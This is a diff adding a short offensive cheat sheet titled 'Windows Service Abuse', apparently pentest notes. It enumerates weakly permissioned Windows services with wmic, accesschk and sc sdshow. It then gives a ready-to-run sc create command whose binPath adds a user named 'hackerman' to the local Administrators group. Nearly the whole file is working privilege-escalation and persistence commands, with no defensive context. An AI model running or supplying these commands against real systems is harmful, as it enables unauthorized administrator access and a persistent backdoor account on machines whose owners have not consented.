@@ -1,0 +1,13 @@
+WINDOWS SERVICE ABUSE
+Show permissions of what users/groups can access this service. 
+
+1. wmic useraccount where name='username' get sid    - this will give you your sid
+
+2. accesschk.exe -uwcqv "Username"  * /accepteula   - this will show potentially vulnerable services
+
+sc sdshow <service name from accesschk>    - this will show permissions of a service
+
+Create service to execute commands
+
+sc create MyService displayName= "MyService" binPath= "C:\Windows\System32\net.exe localgroup Administrators hackerman /add" start= auto
+
